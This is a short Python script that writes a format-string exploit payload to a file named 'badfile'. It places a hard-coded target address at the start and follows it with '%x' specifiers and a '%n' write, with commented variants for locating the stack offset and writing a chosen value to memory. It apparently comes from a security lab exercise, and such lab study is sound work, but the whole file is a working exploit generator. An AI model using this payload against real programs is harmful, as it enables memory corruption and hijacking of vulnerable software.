import sys
n = 1200
content = bytearray(0x0 for i in range(n))
#put the address at the beginning
addr = 0xffffd724
content[0:4] = addr.to_bytes(4, byteorder='little')

#add format specifiers
# investigation to find the distance
# s = '%x_'*10 + '\n'

#modify memory
s = '%x_'*5 + '%n' + '\n'

#modify memory with value?
# D = 0x6688 - 4 - 8*4
# s = '%.8x'*4 + '%.' + str(D) + 'x' + '%n' + '\n'

#store the string to the content bytearray
fmt = s.encode('latin-1')
content[4:4+len(fmt)] = fmt

#write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
